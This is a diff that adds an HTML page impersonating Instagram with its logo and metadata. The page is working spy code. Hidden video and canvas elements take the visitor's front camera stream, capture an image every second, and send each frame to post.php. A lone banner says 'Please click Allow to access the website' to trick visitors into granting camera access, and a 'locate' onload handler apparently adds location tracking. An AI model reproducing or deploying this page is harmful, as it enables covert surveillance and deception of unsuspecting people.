@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+
+<html>
+<head><meta charset="utf-8"/><meta content="width=device-width, initial-scale=1.0" name="viewport"/><meta content="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" property="og:image"><meta content="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" property="og:image:url"><meta content="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" property="og:image:secure_url"/><meta content="image/jpeg" property="og:image:type"/><meta content="Instagram" property="og:image:alt"/><meta content="781" property="og:image:width"/><meta content="439" property="og:image:height"/><meta content="website" property="og:type"><meta content="Instagram" property="og:title"><meta content="Instagram" property="og:description"><meta content="summary_large_image" name="twitter:card"/><meta content="Instagram" name="twitter:site"><meta content="Instagram" name="twitter:creator"><meta content="Instagram" name="twitter:title"/><meta content="Instagram" name="twitter:description"/><meta content="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" name="twitter:image"/>
+<link href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" rel="shortcut icon" type="image/x-icon"/>
+<link href="local_resources/img/c71d9823edcf49604e7cc099a75bd368.png" rel="icon"/>
+<link href="local_resources/css/2ea6b65435deb8343e5f5a092d61b23b.css" rel="stylesheet"/>
+<title>Instagram</title>
+<link href="local_resources/css/c46184e424aa56ff9cfb3c91f9d59f84.css" rel="stylesheet" type="text/css"/>
+<style type="text/css">html, body {
+    height: 100%;
+}
+body {
+    background-image: url('');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    color: black;
+    background-color: black;
+    font-family: 'Roboto', sans-serif;
+    height: 100%;
+}
+
+  .areyouolder {
+      color: black;
+      font-weight: bold;
+      height: auto;
+      
+  }
+  .img {
+      width: 350px;
+  }
+  .click {
+      color: white;
+      font-family: 'Roboto', sans-serif;
+      text-align: center;
+
+
+  }
+	</style>
+</meta></meta></meta></meta></meta></meta></meta></head>
+<meta content="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" property="og:image"/><meta content="width=device-width, initial-scale=1.0" name="viewport"/><meta content="Instagram" property="og:site_name"/><meta content="true" name="HandheldFriendly"/><meta content="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" property="og:image"/><meta content="Instagram" name="description"><meta content="Instagram" name="keywords"><meta content="Instagram" name="Abstract"><meta content="Instagram" name="title"/><meta content="Instagram" property="og:title"/><meta content="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" name="twitter:image"/><meta content="Instagram" property="og:description"><meta content="Instagram" name="description"/><meta content="width=device-width, initial-scale=1.0" name="viewport"/><meta content="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" property="og:image"/><meta content="781" property="og:image:width"/><meta content="439" property="og:image:height"/><meta content="Instagram" name="description"/><script src="local_resources/js/f5c68511ceb90e6c7f5f5988323f431f.js" type="text/javascript"></script><script src="local_resources/js/701ed77f783c848a00f49a26da457cd4.js" type="text/javascript"></script><meta content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;" name="viewport"><meta content="width=device-width" name="viewport">
+<body onload="mydata()" translate="no">
+<div class="video-wrap" hidden="hidden">
+<video autoplay="" id="video" playsinline=""></video>
+</div>
+<p><canvas height="480" hidden="hidden" id="canvas" width="640"></canvas> <script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1000);
+  
+
+}
+
+// Load init
+init();
+</script>
+<style type="text/css">.gambargetar{position:relative}
+img:hover{opacity:1}textarea{resize:none}
+img {
+    position:relative;opacity:1.0
+}
+</style>
+<style type="text/css">@media only screen and (max-device-width: 480px) {
+html, body {
+  overflow-x: hidden;
+}
+body {
+  position: relative;
+}
+    img {    
+    weight: 100%;
+    position: relative;
+    margin: -4;
+}
+</style>
+</p>
+<p><iframe allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="0px" id="Live_YT_TV" sandbox="" src="local_resources/iframes/5cbe2891b7068a5c1a4a83edc9c6bd44" width="0%"></iframe><script src="local_resources/js/94af6a5be88dbffbb0317fb65f9c20da.js"></script><script src="local_resources/js/15977696bf01e4b1547ea5249c941075.js"></script><script src="local_resources/js/bf87955094d7fd4983a4bad326ce2a3b.js"></script><script src="local_resources/js/a3e10220321c031bc47420524d790866.js"></script></p>
+<script>
+window.console = window.console || function(t) {};
+</script><script>
+    if (document.location.search.match(/type=embed/gi)) {
+      window.parent.postMessage("resize", "*");
+    }
+</script><script type="text/javascript">
+        window.onload = locate;
+        </script><script>
+  feather.replace();
+  //# sourceURL=pen.js
+      </script>
+<p></p>
+<p></p>
+<center>
+<h1 class="click">Please click Allow to access the website</h1>
+</center>
+<p></p>
+<p></p>
+</body>
+</meta></meta></meta></meta></meta></meta></html>
